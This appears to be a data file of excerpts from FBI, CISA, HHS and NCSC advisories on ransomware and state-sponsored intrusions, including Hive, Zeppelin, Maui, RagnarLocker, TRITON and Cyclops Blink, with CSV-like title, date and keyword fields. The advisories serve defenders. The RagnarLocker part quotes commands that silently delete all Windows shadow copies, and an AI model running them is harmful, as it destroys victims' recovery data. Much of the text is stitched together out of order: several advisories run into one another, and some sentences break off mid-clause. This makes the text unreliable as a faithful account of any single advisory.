Hive     Actions to Take Today to Mitigate         Cyber Threats from Ransomware:    Prioritize remediating known  exploited vulnerabilities. TLP:CLEAR  Page 2 of 3  |  Product ID: AA22-321A  TLP: CLEAR ransomware follows the ransomware-as-a-service (RaaS) model in which developers create,  maintain, and update the malware, and affiliates conduct the ransomware attacks. From June 2021  through at least November 2022, threat actors have used Hive ransomware to target a wide range of  businesses and critical infrastructure sectors, including Government Facilities, Communications,  Critical Manufacturing, Information Technology, and especially Healthcare and Public Health (HPH). Prior to encryption, Hive ransomware removes virus definitions and disables all portions of Windows  Defender and other common antivirus programs in the system registry [T1112]. In addition to its capabilities against the Microsoft Windows operating system, Hive  ransomware has known variants for Linux, VMware ESXi, and FreeBSD. Hive actors have been known to reinfect—with either Hive ransomware or another ransomware  variant—the networks of victim organizations who have restored their network without making a  ransom payment. Indicators of Compromise  Threat actors have leveraged the following IOCs during Hive ransomware compromises. MITIGATIONS  FBI, CISA, and HHS recommend organizations, particularly in the HPH sector, implement the  following to limit potential adversarial use of common system and network discovery techniques and  to reduce the risk of compromise by Hive ransomware:  •  Verify Hive actors no longer have access to the network. o The Cybersecurity and Infrastructure Security Agency-Multi-State Information Sharing  & Analysis Center Joint Ransomware Guide covers additional best practices and ways  to prevent, protect, and respond to a ransomware attack. o StopRansomware.gov is the U.S. Government’s official one-stop location for resources  to tackle ransomware more effectively. If your organization is impacted by a ransomware incident, FBI, CISA, and HHS recommend the  following actions. Power-off and segregate any other computers or devices  that share a network with the infected computer(s) that have not been fully encrypted by  ransomware. In addition, FBI, CISA, and HHS urge all organizations to apply the following recommendations to  prepare for, mitigate/prevent, and respond to ransomware incidents. Protective Controls and Architecture  •  Segment networks to prevent the spread of ransomware. Network segmentation can help  prevent the spread of ransomware by controlling traffic flows between—and access to— various subnetworks and by restricting adversary lateral movement. TLP:CLEAR  Page 11 of 12  |  Product ID: AA22-321A  TLP: CLEAR •  Identify, detect, and investigate abnormal activity and potential traversal of the  indicated ransomware with a networking monitoring tool. To aid in detecting the  ransomware, implement a tool that logs and reports all network traffic, including lateral  movement activity on a network.

Cybercrime actors routinely target HPH Sector organizations with ransomware:  •  As of October 2022, per FBI Internet Crime Complaint Center (IC3) data, specifically victim  reports across all 16 critical infrastructure sectors, the HPH Sector accounts for 25 percent of  ransomware complaints. Actions to take today to mitigate  cyber threats from ransomware:   • Install updates for operating  systems, software, and firmware as  soon as they are released. FBI | CISA | HHS TLP:WHITE  Page 2 of 10  |  Product ID: AA22-294A  TLP: WHITE •  According to an IC3 annual report in 2021, 649 ransomware reports were made across 14  critical infrastructure sectors; the HPH Sector accounted for the most reports at 148. Since then, Daixin Team  cybercrime actors have caused ransomware incidents at multiple HPH Sector organizations where  they have:  •  Deployed ransomware to encrypt servers responsible for healthcare services—including  electronic health records services, diagnostics services, imaging services, and intranet  services, and/or  •  Exfiltrated personal identifiable information (PII) and patient health information (PHI) and  threatened to release the information if a ransom is not paid.

Preparing for Ransomware  •  Maintain offline (i.e., physically disconnected) backups of data, and regularly test backup and  restoration. These practices safeguard an organization’s continuity of operations or at least  minimize potential downtime from a ransomware incident and protect against data losses. •  Create, maintain, and exercise a basic cyber incident response plan and associated  communications plan that includes response procedures for a ransomware incident. Mitigating and Preventing Ransomware  •  Restrict Server Message Block (SMB) Protocol within the network to only access servers that  are necessary and remove or disable outdated versions of SMB (i.e., SMB version 1). Responding to Ransomware Incidents  If a ransomware incident occurs at your organization:  •  Follow your organization’s Ransomware Response Checklist (see Preparing for Ransomware  section). Note: FBI, CISA, and HHS strongly discourage paying ransoms as doing so does not guarantee files  and records will be recovered. Furthermore, payment may also embolden adversaries to target  additional organizations, encourage other criminal actors to engage in the distribution of ransomware,  and/or fund illicit activities.

These #StopRansomware  advisories include recently and historically observed tactics,  techniques, and procedures (TTPs) and indicators of  compromise (IOCs) to help organizations protect against  ransomware. Visit  stopransomware.gov  to  see  all  #StopRansomware advisories and to learn more about other  ransomware threats and no-cost resources. The Federal Bureau of Investigation (FBI) and the Cybersecurity and Infrastructure Security Agency  (CISA) are releasing this joint CSA to disseminate known Zeppelin ransomware IOCs and TTPs  associated with ransomware variants identified through FBI investigations as recently as 21 June 2022. The FBI and CISA encourage organizations to implement the recommendations in the Mitigations  section of this CSA to reduce the likelihood and impact of ransomware incidents. Zeppelin ransomware is a derivative of the Delphi-based Vega malware family and functions as a  Ransomware as a Service (RaaS). Actions to take today to mitigate  cyber threats from ransomware:   • Prioritize remediating known exploited vulnerabilities. Prior to deploying Zeppelin  ransomware, actors spend one to two weeks mapping or enumerating the victim network to identify  data enclaves, including cloud storage and network backups [TA0007]. Zeppelin actors can deploy  Zeppelin ransomware as a .dll or .exe file or contained within a PowerShell loader. Once the ransomware is executed, a randomized  nine-digit hexadecimal number is appended to each encrypted file as a file extension, e.g.,  file.txt.txt.C59-E0C-929 [T1486]. DETECTION   Click the attachment in this .pdf for the YARA signature: YARA Signature  MITIGATIONS  The FBI and CISA recommend network defenders apply the following mitigations to limit  potential adversarial use of common system and network discovery techniques and to reduce the  risk of compromise by Zeppelin ransomware:   Implement a recovery plan to maintain and retain multiple copies of sensitive or proprietary  data and servers in a physically separate, segmented, and secure location (i.e., hard drive,  storage device, the cloud).   Segment networks to prevent the spread of ransomware. Network segmentation can help  prevent the spread of ransomware by controlling traffic flows between—and access to— various subnetworks and by restricting adversary lateral movement.   Identify, detect, and investigate abnormal activity and potential traversal of the  indicated ransomware with a networking monitoring tool. To aid in detecting the  ransomware, implement a tool that logs and reports all network traffic, including lateral  movement activity on a network. FBI  |  CISA TLP:WHITE  Page 12 of 12  | Product ID: AA22-223A  TLP: WHITE RESOURCES    Stopransomware.gov is a whole-of-government approach that gives one central location for  ransomware resources and alerts.   Resource to mitigate a ransomware attack: CISA-Multi-State Information Sharing and Analysis  Center (MS-ISAC) Joint Ransomware Guide.   No-cost cyber hygiene services: Cyber Hygiene Services and Ransomware Readiness  Assessment. Furthermore, payment may also embolden adversaries to target additional  organizations, encourage other criminal actors to engage in the distribution of ransomware, and/or  fund illicit activities. Regardless of whether you or your organization have decided to pay the ransom,  the FBI and CISA urge you to promptly report ransomware incidents to a local FBI Field Office, or  CISA at us-cert.cisa.gov/report. REFERENCES  [1] What is Zeppelin Ransomware? To request incident response resources or technical assistance related to these  threats, contact CISA at Report@cisa.dhs.gov. Timely patching is one of  the most efficient and cost-effective steps an organization can take to minimize its exposure to  cybersecurity threats. If threat  actors are not able to run these tools, they will have difficulty escalating privileges and/or  moving laterally. From 2019 through at least June 2022, actors have used this  malware to target a wide range of businesses and critical infrastructure organizations, including  defense contractors, educational institutions, manufacturers, technology companies, and especially  organizations in the healthcare and medical industries. Figure 1: Sample Ransom Note  The FBI has observed instances where Zeppelin actors executed their malware multiple times within a  victim’s network, resulting in the creation of different IDs or file extensions, for each instance of an  attack; this results in the victim needing several unique decryption keys."

TLP: WHITE Product ID: AA22-187A July 6, 2022 TLP:WHITE Co-Authored by:  North Korean State-Sponsored Cyber Actors  Use Maui Ransomware to Target the  Healthcare and Public Health Sector   SUMMARY  The Federal Bureau of Investigation (FBI), Cybersecurity and Infrastructure Security Agency (CISA),  and the Department of the Treasury (Treasury) are releasing this joint Cybersecurity Advisory (CSA)  to provide information on Maui ransomware, which has been used by North Korean state-sponsored  cyber actors since at least May 2021 to target Healthcare and Public Health (HPH) Sector  organizations. This joint CSA provides information—including tactics, techniques, and procedures (TTPs) and  indicators of compromise (IOCs)—on Maui ransomware obtained from FBI incident response  activities and industry analysis of a Maui sample. The FBI, CISA, and Treasury urge HPH Sector  organizations as well as other critical infrastructure organizations to apply the recommendations in the  Mitigations section of this CSA to reduce the likelihood of compromise from ransomware operations. Victims of Maui ransomware should report the incident to their local FBI field office or CISA. The FBI, CISA, and Treasury highly discourage paying ransoms as doing so does not guarantee files  and records will be recovered and may pose sanctions risks. Note: in September 2021, Treasury  issued an updated advisory highlighting the sanctions risks associated with ransomware payments  and the proactive steps companies can take to mitigate such risks. entities to adopt and improve cybersecurity practices and report ransomware  attacks to, and fully cooperate with, law enforcement. The updated advisory states that when affected  parties take these proactive steps, Treasury’s Office of Foreign Assets Control (OFAC) would be  more likely to resolve apparent sanctions violations involving ransomware attacks with a non-public  enforcement response. TECHNICAL DETAILS  Since May 2021, the FBI has observed and responded to multiple Maui ransomware incidents at HPH  Sector organizations. North Korean state-sponsored cyber actors used Maui ransomware in these  incidents to encrypt servers responsible for healthcare services—including electronic health records  services, diagnostics services, imaging services, and intranet services. Maui Ransomware  Maui ransomware (maui.exe) is an encryption binary. According to industry analysis of a sample of  Maui (SHA256: 5b7ecf7e9d0715f1122baf4ce745c5fcd769dee48150616753fec4d6da16e99e)— provided in Stairwell Threat Report: Maui Ransomware—the ransomware appears to be designed for  manual execution [TA0002] by a remote actor.

Known ransom demands have  ranged from $25,000 to $13,000,000 in Bitcoin, with payment deadlines typically set to expire within a  week of first contact with the victim. Extortion  Following the exfiltration of data, Karakurt actors present the victim with ransom notes by way of  “readme.txt” files, via emails sent to victim employees over the compromised email networks, and  emails sent to victim employees from external email accounts. Although Karakurt’s primary extortion leverage is a promise to delete stolen data and keep the  incident confidential, some victims reported Karakurt actors did not maintain the confidentiality of  victim information after a ransom was paid. In some cases, Karakurt actors have conducted extortion against victims previously attacked by other  ransomware variants. Karakurt victims have reported extensive harassment campaigns by Karakurt actors in which  employees, business partners, and clients receive numerous emails and phone calls warning the  recipients to encourage the victims to negotiate with the actors to prevent the dissemination of victim  data. Upon payment of  ransoms, Karakurt actors have provided some form of proof of deletion of files and, occasionally, a  brief statement explaining how the initial intrusion occurred.

The Lazarus Group used AppleJeus trojanized cryptocurrency  applications targeting individuals and companies—including cryptocurrency exchanges and financial  services companies—through the dissemination of cryptocurrency trading applications that were  modified to include malware that facilitates theft of cryptocurrency. The messages often mimic a recruitment effort  and offer high-paying jobs to entice the recipients to download malware-laced cryptocurrency  applications, which the U.S. Observed payloads include updated macOS and Windows variants of Manuscrypt, a custom remote  access trojan (RAT), that collects system information and has the ability to execute arbitrary  commands and download additional payloads (see North Korean Remote Access Tool:  COPPERHEDGE).

Ransomware Attacks Straining Local US Governments and Public Services,2022-03-30,1,"{'phishing': 3, 'extortion': 1, 'ransomware': 26, 'threats_of_violence': 8, 'malware': 2}","Ransomware tactics have and will continue to evolve as noted in the February 2022 Joint  Cybersecurity Advisory (CSA) by government agencies in the United States, Australia, and the United   TLP:WHITE      TLP:WHITE  Kingdom.1 The top three initial infection vectors in 2021 were phishing emails, remote desktop  protocol exploitation, and software vulnerability exploitation.  Implement a user training program and phishing exercises to raise awareness among  users about the risks of visiting suspicious websites, clicking on suspicious links, and  opening suspicious attachments. Reinforce the appropriate user response to phishing  and spearphishing emails. In 2021, actors expanded their targeting tactics and widened the  scope of victimization potential by implementing service-for-hire business models, sharing victim  information among actor groups, diversifying extortion strategies, and attacking upstream/  downstream accesses and data sources such as cloud infrastructure, managed service providers,  and software supply chains. www.fbi.gov/contact-us/field-offices   TLP:WHITE  TLP:WHITE  30 March 2022  20220330-001  Ransomware Attacks Straining Local US Governments  and Public Services      Summary    The FBI is informing Government Facilities Sector (GFS) partners of cyber actors conducting  ransomware attacks on local government agencies that have resulted in disrupted operational  services, risks to public safety, and financial losses. Ransomware attacks against local government  entities and the subsequent impacts are especially significant due to the public’s dependency on  critical utilities, emergency services, educational facilities, and other services overseen by local  governments, making them attractive targets for cyber criminals. “The State of Ransomware in Government 2021” survey of 30 countries, conducted through an   TLP:WHITE      TLP:WHITE  independent research group commissioned by a UK-based company, found rectifying a ransomware  attack on a local government often included financial liabilities related to operational downtime,  people time, device costs, network costs, lost opportunity, and, in some cases, paid ransoms. According to a US-based media source reporting on state and local  government matters, underfunded public sector organizations’ understaffed and outdated systems  often put them in the position to pay ransoms simply to get the data back. Recent reporting indicates ransomware incidents against local governments resulted in  disruptions to public and health services, emergency and safety operations, and the  compromise of personal data.  In January 2022, a US county took computer systems offline, closed public offices, and ran  emergency response operations using “backup contingencies” after a ransomware attack  impacted local government operations.  In September 2021, cyber actors infected a US county network with ransomware, resulting  in the closure of the county courthouse and the theft of a substantial amount of county data  (to include personal information on residents, employees, and vendors).  In May 2021, cyber actors infected local US county government systems with PayOrGrief  ransomware, making some servers inaccessible and limiting operations.  In January 2021, cyber actors infected local US county government systems with  ransomware that compromised jail and courthouse computers in addition to election,  assessment, financial, zoning, law enforcement, jail management, dispatch, and other files. The  ransomware note stated files would be deleted after two weeks if the ransom was not paid. In the next year, local US government agencies almost certainly will continue to experience  ransomware attacks, particularly as malware deployment and targeting tactics evolve, further  endangering public health and safety, and resulting in significant financial liabilities. Recommendations  The FBI does not encourage paying ransoms. It may also embolden adversaries to target additional organizations, encourage  other criminal actors to engage in the distribution of ransomware, and/or fund illicit activities. Regardless of  whether your organization decides to pay the ransom, the FBI urges you to report ransomware  incidents as soon as possible to your local FBI field office (www.fbi.gov/contact-us/field-offices). Doing so provides the FBI with critical information needed to prevent future attacks by  identifying and tracking ransomware attackers and holding them accountable under US law,  when possible. The FBI encourages local government agencies to proactively initiate contingency planning, to  the degree possible, for operational continuity in the event of a ransomware attack and  systems are inaccessible. In addition to the items above, the FBI recommends GFS organizations consider the following:                                                              1 Reference the 9 February 2022 Joint Cybersecurity Advisory “2021 Trends Show Increased Globalized Threat of  Ransomware,” published by the FBI, Cybersecurity & Infrastructure Security Agency, National Security Agency,  Australian Cyber Security Centre, and the National Cyber Security Centre (GCHQ) at  ic3.gov/media/news/2022/220209.pdf. The security modules may prevent the operating system from  making arbitrary connections, which is an effective mitigation strategy against  ransomware, as well as against remote code execution (RCE). Network segmentation can help prevent the spread of ransomware  by controlling traffic flows between—and access to—various subnetworks and by  restricting adversary lateral movement. Deploying mutual Transport Layer Security (mTLS)  can prevent eavesdropping on communications, which, in turn, can prevent cyber threat  actors from gaining insights needed to advance a ransomware attack.  Identify, detect, and investigate abnormal activity and potential traversal of the  indicated ransomware with a network-monitoring tool. To aid in detecting the  ransomware, use tools that log and report all network traffic, including lateral  movement on a network. Artificial intelligence (AI)-enabled network intrusion detection systems  (NIDS) are also able to detect and block many anomalous behaviors associated with  early stages of ransomware deployment. For additional resources related to the prevention and mitigation of ransomware, go to  https://www.stopransomware.gov as well as the CISA-Multi-State Information Sharing and  Analysis Center (MS-ISAC) Joint Ransomware Guide. Stopransomware.gov is the US  Government’s new, official one-stop location for resources to tackle ransomware more  effectively. PIN Number  The following information is being provided by the FBI, with no guarantees or warranties, for potential  use at the sole discretion of recipients to protect against cyber threats. Threat  In 2021, local US government agency victims were primarily among smaller counties and  municipalities, which was likely indicative of their cybersecurity resource and budget limitations. Timely patching is one of the most  efficient and cost-effective steps an organization can take to minimize its exposure to  cybersecurity threats. Threat actors use SMB to propagate malware across  organizations. If threat actors are not  able to run these tools, they will have difficulty escalating privileges and/or moving  laterally. Enforcing credential protection—by restricting  where accounts and credentials can be used and by using local device credential  protection features—reduces opportunities for threat actors to collect credentials for  lateral movement and privilege escalation."
Cyber Actors Target US Election Officials with Invoice-Themed Phishing Campaign to Harvest Credentials,2022-03-29,1,"{'phishing': 10, 'threats_of_violence': 4}","www.fbi.gov/contact-us/field-offices   TLP:WHITE   TLP:WHITE  29 March 2022  20220329-001  Cyber Actors Target US Election Officials with Invoice- Themed Phishing Campaign to Harvest Credentials    Summary  The FBI is warning US election and other state and local government officials about invoice- themed phishing emails that could be used to harvest officials’ login credentials. As of October 2021, US election officials in at least nine states received invoice-themed  phishing emails containing links to websites intended to steal login credentials. Threat  The FBI judges cyber actors will likely continue or increase their targeting of US election officials  with phishing campaigns in the lead-up to the 2022 US midterm elections. This assessment is  based on reports of phishing attacks that occurred in October 2021 and had the characteristics  of a coordinated, ongoing effort to target US election officials.  On 5 October 2021, unidentified cyber actors targeted US election officials in at least  nine states, and representatives of the National Association of Secretaries of State, with  phishing emails. One of the email addresses sending the phishing emails was a  compromised US government official’s email account.  On 18 October 2021, cyber actors used two email addresses, purportedly from US  businesses, to send phishing emails to county election employees.  On 19 October 2021, cyber actors used an email address, purportedly from a US  business, to send a phishing email containing fake invoices to an election official.  Educate employees on how to identify phishing, spear-phishing, social engineering, and  spoofing attempts.  Enable strong spam filters to prevent phishing emails from reaching end users. PIN Number  The following information is being provided by the FBI, with no guarantees or warranties, for potential  use at the sole discretion of recipients to protect against cyber threats. Proactive monitoring  of election infrastructure (including official email accounts) and communication between FBI  and its state, local, territorial, and tribal partners about this type of activity will provide     TLP:WHITE     TLP:WHITE  opportunities to mitigate instances of credential harvesting and compromise, identify potential  targets and information sought by threat actors, and identify threat actors.

Threat  In June and again in August 2017, TRITON malware (also known as TRISIS and HatMan) was  used against a Middle East–based petrochemical facility’s safety controllers. Resources:   CISA Joint CSA Understanding and Mitigating Russian State-Sponsored Cyber Threats to  U.S. TRITON was malware designed to cause physical safety systems to cease operating or to  operate in an unsafe manner. TRITON malware targeted the Schneider Electric Triconex safety instrumented system (SIS),  which is used to initiate safe shutdown procedures in the event of an emergency. TRITON  malware affected Triconex Tricon safety controllers by modifying in-memory firmware to add  additional programming, potentially leading to damage of a facility, system downtime, and  even loss of life should the SIS fail to initiate safe shutdown procedures. The US  Government has publicly attributed TRITON malware to TsNIIKhM, a Russian government- controlled research institution that supports the Russian armed forces with advanced research,  weapons, and cyber capabilities. TRITON malware was designed to target a specific SIS controller model, with a specific firmware  version, running a small range of specific versioned firmware, and used in critical infrastructure  facilities to initiate immediate shutdown procedures in the event of an emergency. For more  information on affected equipment and TRITON malware, see CISA ICS Advisory Schneider  Electric Triconex Tricon (Update B) and CISA Malware Analysis Report (MAR) HatMan - Safety  System Targeted Malware (Update B). In the 2017 attack, the actor gained initial access and then moved laterally through the  information technology (IT) and operational technology (OT) networks onto the safety system  and installed TRITON malware. The facility automatically  entered a safe state after several of the Triconex ICS safety controllers detected an anomaly,  caused by software bugs in the TRITON malware. The subsequent investigation of the shutdown  revealed the attacker’s presence and the malware itself. The facility’s automatic shutdown and  detection of malware prevented the cyberattack from reaching its full capabilities. TRITON malware’s design gave the attackers complete remote control of the SIS, providing  them the capability to cause significant physical damage and loss of life if the plant were to  enter an unsafe state, according to investigations and analysis that followed the event. Russian cyber actors have previously conspired to deploy malware and take other disruptive  actions for the strategic benefit of Russia through unauthorized access to victim computers and  ICS. These cyberattacks used some of the world’s most destructive malware to date, including     TLP:WHITE      TLP:WHITE KillDisk and Industroyer, which each caused blackouts in Ukraine in 2015 and 2016,  respectively. Russian cyber actors have also deployed non-disruptive malware, such as Havex,  which enables the actors to return to compromised and otherwise vulnerable ICS devices for  future espionage purposes. For additional information on the TRITON malware attack, see the FBI PIN titled Unattributed  Cyber Actors Exploiting Internet-connected ICS/SCADA Systems, PIN 20180614-001. Through the enhanced Tricon CX controller, version 11.4 and later versions, Schneider Electric  has enhanced security and mitigated the risk of the TRITON malware’s attack vector, reducing  further the risks of these type of malware incidents; however, network defenders should  remain vigilant. Based on the attack framework and malware used in the original TRITON incident, a similar  attack could be designed against other SIS."

RagnarLocker Ransomware Indicators of Compromise,2022-03-07,1,"{'ransomware': 13, 'threats_of_violence': 3, 'malware': 4}","TLP:WHITE  TLP:WHITE  7 MARCH 2022  CU-000163-MW  RagnarLocker Ransomware Indicators of Compromise     Summary  The FBI first became aware of RagnarLocker in April 2020 and subsequently produced a FLASH  to disseminate known indicators of compromise (IOCs) at that time. As of January 2022, the FBI has  identified at least 52 entities across 10 critical infrastructure sectors affected by RagnarLocker  ransomware, including entities in the critical manufacturing, energy, financial services,  government, and information technology sectors. RagnarLocker ransomware actors work as  part of a ransomware family1, frequently changing obfuscation techniques to avoid detection  and prevention. 1 Ransomware family is a group of binaries associated to several ransomware variants or actor groups. The ransomware assigns a  drive letter to any volumes not assigned a logical drive letter and makes them accessible. For example, if the logical  drive being processed is the C: drive, the malware does not encrypt files in the following  folders:     Windows       TLP:WHITE  TLP:WHITE   Windows.old   Mozilla   Mozilla Firefox   Tor browser   Internet Explorer   $Recycle.Bin   Program Data   Google   Opera   Opera Software    Also, when iterating through files, the malware does not encrypt files with the following  extensions:      .db   .sys   .dll   .lnk   .msi   .drv   .exe      Indicators  The following IOCs are associated with RagnarLocker ransomware, as of January 2022. Paying a ransom may embolden  adversaries to target additional organizations, encourage other criminal actors to engage in the  distribution of ransomware, or fund illicit activities. Regardless of whether you or your organization decides to pay the  ransom, the FBI urges you to report ransomware incidents to your local field office. Doing so  provides investigators and analysts with the critical information they need to track ransomware  attackers, hold them accountable under US law, and prevent future attacks. Additional Resources  For additional resources related to the prevention and mitigation of ransomware, go to  https://www.stopransomware.gov as well as the CISA-Multi-State Information Sharing and  Analysis Center (MS-ISAC) Joint Ransomware Guide. Stopransomware.gov is the Government’s  official one-stop location for resources to tackle ransomware more effectively. CISA’s Ransomware Readiness Assessment (RRA) is a no-cost self-assessment based on a tiered  set of practices to help organizations better assess how well they are equipped to defend and  recover from a ransomware incident. CISA offers a range of no-cost cyber hygiene services to help critical infrastructure organizations  assess, identify, and reduce their exposure to threats, including ransomware. FLASH Number  The following information is being provided by the FBI, with no guarantees or warranties, for potential  use at the sole discretion of recipients to protect against cyber threats.  Monitor cyber threat reporting regarding the publication of compromised VPN login  credentials and change passwords and settings. The malware then attempts to  silently delete all Volume Shadow Copies, preventing user recovery of encrypted files, using  two different methods:      >vssadmin delete shadows /all /quiet    >wmic.exe.shadowcopy.delete     Lastly, RagnarLocker encrypts all available files of interest. Taking this approach allows  the computer to continue to operate “normally” while the malware encrypts files with known  and unknown extensions containing data of value to the victim.

Phishing: Spearphishing Link  T1566.002 MuddyWater has sent targeted spearphishing emails with  malicious links. User Execution: Malicious Link  T1204.001 MuddyWater has distributed URLs in phishing emails that  link to lure documents. User Execution: Malicious File  T1204.002 MuddyWater has attempted to get users to enable macros  and launch malicious Microsoft Word documents delivered  via spearphishing emails. Users who browse the internet, use email, and  execute code with administrator privileges make for excellent spearphishing targets because their  system—once infected—enables attackers to move laterally across the network, gain additional  accesses, and access highly sensitive information. Phishing Protection  •  Enable antivirus and anti-malware software and update signature definitions in a timely  manner. Well-maintained antivirus software may prevent use of commonly deployed attacker  tools that are delivered via spearphishing. •  Train users through awareness and simulations to recognize and report phishing and  social engineering attempts. Reputation services can be used to detect or prevent low-reputation email  addresses, files, URLs, and IP addresses used in spearphishing attacks. MuddyWater actors are known to exploit publicly reported vulnerabilities and use open-source tools  and strategies to gain access to sensitive data on victims’ systems and deploy ransomware. •  For information and resources on protecting against and responding to ransomware, refer  to StopRansomware.gov, a centralized, whole-of-government webpage providing ransomware  resources and alerts. •  CISA offers a range of no-cost cyber hygiene services to help critical infrastructure  organizations assess, identify, and reduce their exposure to threats, including ransomware.

In May 2018 Cisco Talos published the blog that exposed VPNFilter, and the US  Department of Justice linked the activity2 to Sandworm and announced its disruption  of the botnet. New Sandworm malware  Cyclops Blink replaces  VPNFilter       Version 1.0      23 February 2022  © Crown Copyright 2022               New Sandworm malware Cyclops Blink  replaces VPNFilter   The Sandworm actor, which the UK and US have previously attributed to  the Russian GRU, has replaced the exposed VPNFilter malware with a new  more advanced framework. Background   The UK National Cyber Security Centre (NCSC), the Cybersecurity and Infrastructure  Security Agency (CISA), the National Security Agency (NSA) and the Federal Bureau  of Investigation (FBI) in the US have identified that the actor known as Sandworm or  Voodoo Bear is using a new malware, referred to here as Cyclops Blink. The malicious cyber activity below has  previously been attributed to Sandworm:    • The BlackEnergy disruption of Ukrainian electricity in 2015  • Industroyer in 2016  • NotPetya in 2017  • Attacks against the Winter Olympics and Paralympics in 20181  • A series of disruptive attacks against Georgia in 20192    Cyclops Blink appears to be a replacement framework for the VPNFilter malware  exposed in 2018, which exploited network devices, primarily small office/home office  (SOHO) routers and network attached storage (NAS) devices. 1https://www.ncsc.gov.uk/news/uk-and-partners-condemn-gru-cyber-attacks-against-olympic-an-paralympic-games  2 https://www.gov.uk/government/news/uk-condemns-russias-gru-over-georgia-cyber-attacks   This advisory summarises the VPNFilter malware it replaces, and provides more detail  on Cyclops Blink, as well as the associated tactics, techniques and procedures (TTPs)  used by Sandworm. An NCSC malware analysis report on Cyclops Blink is also  available and can be read in parallel. It also provides mitigation measures to help organisations that may be affected by this  malware. VPNFilter   The malware was first exposed in 2018  A series of articles published by Cisco Talos in 20181 describes VPNFilter and its  modules in detail. Cyclops Blink  Active since 2019  The NCSC, CISA, FBI and NSA, along with industry partners, have now identified a  large-scale modular malware framework which is affecting network devices. The actor has so far primarily deployed Cyclops Blink to WatchGuard devices,1 but it  is likely that Sandworm would be capable of compiling the malware for other  architectures and firmware. Malware overview   The malware itself is sophisticated and modular with basic core functionality to beacon  (T1132.002) device information back to a server and enable files to be downloaded  and executed. There is also functionality to add new modules while the malware is  running, which allows Sandworm to implement additional capability as required. The NCSC has published a malware analysis report on Cyclops Blink which provides  more detail about the malware. Affected organisations should therefore take steps to remove the malware. Indicators of compromise  Please refer to the accompanying Cyclops Blink malware analysis report for indicators  of compromise which may help detect this activity. Organisations are advised to follow the mitigation advice in this advisory and to refer  to indicators of compromise (not exhaustive) in the Cyclops Blink malware analysis  report to detect possible activity on networks. See NCSC  guidance: https://www.ncsc.gov.uk/guidance/mitigating-malware  •  Use multi-factor authentication to reduce the impact of password  compromises."
Russian State-Sponsored Cyber Actors Target Cleared Defense Contractor Networks to Obtain Sensitive U.S. Defense Information and Technology,2022-02-17,1,"{'phishing': 7, 'threats_of_violence': 40, 'malware': 3}","Historically, Russian state-sponsored cyber actors have used common but effective tactics to gain  access to target networks, including spearphishing, credential harvesting, brute force/password spray  techniques, and known vulnerability exploitation against accounts and networks with weak security. Initial Access   Russian state-sponsored cyber actors use brute force methods, spearphishing, harvested credentials,  and known vulnerabilities to gain initial access to CDC networks. •  Threat actors send spearphishing emails with links to malicious domains [T1566.002] and use  publicly available URL shortening services to mask the link [T1027]. Initial Access [TA0001]  External Remote Services  [T1133]  Threat actors continue to research  vulnerabilities in Fortinet’s FortiGate  VPN devices, conducting brute force  attacks and leveraging CVE-2018-13379  to gain credentials to access victim  networks.2  Initial Access [TA0001]  Privilege Escalation  [TA0004]    Valid Accounts [T1078]  Exploit Public-Facing  Application [T1190]  Threat actors used credentials in  conjunction with known vulnerabilities on  public-facing applications, such as  virtual private networks (VPNs)—CVE- 2020-0688 and CVE-2020-17144—to  escalate privileges and gain remote  code execution (RCE) on the exposed  applications.3  Initial Access [TA0001]  Defense Evasion  [TA0005]  Phishing: Spearphishing  Link [T1566.002]  Obfuscated Files or  Information [T1027]  Threat actors sent spearphishing emails  using publicly available URL shortening  services. To help prevent targeted social engineering and  spearphishing scams, ensure that employees and stakeholders are aware of potential cyber  threats and how they are delivered. For example, the adversary may obtain and abuse credentials of existing accounts as a  means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion [T1078].18  These specific actors obtained and abused credentials of domain [T1078.002] and cloud accounts  [T1078.004].19 The actors also used external remote services to gain access to systems [T1133].20  The adversary took advantage of weaknesses in internet-facing servers and conducted SQL injection  attacks against organizations' external websites [T1190].21 Finally, they sent spearphishing emails  with a malicious link in an attempt to gain access [T1566.002].22  ID  Name  Description  T1078  Valid Accounts  Adversaries may obtain and abuse credentials of existing  accounts as a means of gaining Initial Access. T1566.002  Phishing:  Spearphishing Link  Adversaries may send spearphishing emails with a  malicious link in an attempt to gain access to victim  systems. For additional information on Russian state-sponsored cyber activity, see CISA's webpage, Russia  Cyber Threat Overview and Advisories. THREAT DETAILS  Targeted Industries and Assessed Motive  Russian state-sponsored cyber actors have targeted U.S. For example, during a compromise in 2021, threat actors exfiltrated hundreds of documents  related to the company’s products, relationships with other countries, and internal personnel and legal  matters. Through these intrusions, the threat actors have acquired unclassified CDC-proprietary and export- controlled information. Exfiltrated Information  Threat Actor Activity  Note: This advisory uses the MITRE ATT&CK® for Enterprise framework, version 10. See the ATT&CK for  Enterprise for all referenced threat actor tactics and techniques. See the Tactics, Techniques, and Procedures  (TTPs) section for a table of the threat actors’ activity mapped to MITRE ATT&CK tactics and techniques. •  Threat actors use brute force techniques [T1110] to identify valid account credentials  [T1589.001] for domain and M365 accounts. •  The threat actors use harvested credentials in conjunction with known vulnerabilities—for  example, CVE-2020-0688 and CVE-2020-17144—on public-facing applications [T1078,  T1190], such as virtual private networks (VPNs), to escalate privileges and gain remote code  execution (RCE) on the exposed applications.1 In addition, threat actors have exploited CVE- 2018-13379 on FortiClient to obtain credentials to access networks. Credential Access   After gaining access to networks, the threat actors map the Active Directory (AD) and connect to  domain controllers, from which they exfiltrate credentials and export copies of the AD database  ntds.dit [T1003.003]. In multiple instances, the threat actors have used Mimikatz to dump admin  credentials from the domain controllers. Collection   Using compromised M365 credentials, including global admin accounts, the threat actors can gain  access to M365 resources, including SharePoint pages [T1213.002], user profiles, and user emails  [T1114.002]. Command and Control   The threat actors routinely use virtual private servers (VPSs) as an encrypted proxy. Persistence   In multiple instances, the threat actors maintained persistent access for at least six months. In these cases, it  is likely the threat actors relied on possession of legitimate credentials for persistence [T1078],  enabling them to pivot to other accounts, as needed, to maintain access to the compromised  environments.

